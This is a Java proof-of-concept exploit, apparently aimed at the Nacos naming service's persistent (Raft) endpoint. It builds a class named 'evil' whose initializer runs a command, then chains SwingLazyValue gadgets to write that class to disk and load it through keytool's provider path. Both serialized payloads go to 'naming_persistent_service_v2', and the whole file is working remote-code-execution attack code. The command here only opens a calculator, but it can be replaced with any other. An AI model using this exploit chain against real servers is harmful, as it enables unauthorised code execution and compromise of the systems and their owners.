package com.exp.nacos;

import javassist.*;
import sun.swing.SwingLazyValue;

public class persistentCalcExp {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("evil");

        CtConstructor cs = ctClass.makeClassInitializer();
        cs.setBody("try {\n" +
                "    Runtime.getRuntime().exec(\"calc\");\n" +
                " }");
        byte[] classBytes = ctClass.toBytecode();

        SwingLazyValue lazyValue1 = new SwingLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{"./evil.class", classBytes});
        SwingLazyValue lazyValue2 = new SwingLazyValue("sun.security.tools.keytool.Main", "main", new Object[]{new String[]{
                "-LIST",
                "-provider:",
                "evil",
                "-keystore",
                "NONE",
                "-protected",
                "-debug",
                "-providerpath",
                "./"
        }});

        utils.sendRequest(utils.packPersistentObject(lazyValue1), "naming_persistent_service_v2");
        utils.sendRequest(utils.packPersistentObject(lazyValue2), "naming_persistent_service_v2");
    }
}
